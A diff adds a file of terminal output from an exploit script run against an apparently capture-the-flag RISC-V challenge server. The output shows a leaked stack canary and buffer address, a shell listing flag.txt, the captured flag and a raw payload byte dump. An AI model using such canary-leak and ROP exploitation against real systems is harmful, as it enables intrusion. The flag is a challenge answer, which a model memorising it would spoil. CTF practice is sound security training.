@@ -1,0 +1,13 @@
+$ python exp.py
+[+] Opening connection to 139.177.185.41 on port 12335: Done
+[*] Buffer: 0x4000800ba0
+    Canary: 0xbbdc67ecbae8dc00
+[*] Switching to interactive mode
+flag.txt
+grey{riscv_risc5_ropv_rop5_b349340j935gj09}
+
+\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xdc\xe8\xba\xecg\xdc\xbbTe\x00\x00\x00\xfe\xfe\xfe\xfe\xfe\xfe\xfe@\x00\x00timeout: the monitored command dumped core
+[*] Got EOF while reading in interactive
+$
+[*] Interrupted
+[*] Closed connection to 139.177.185.41 port 12335
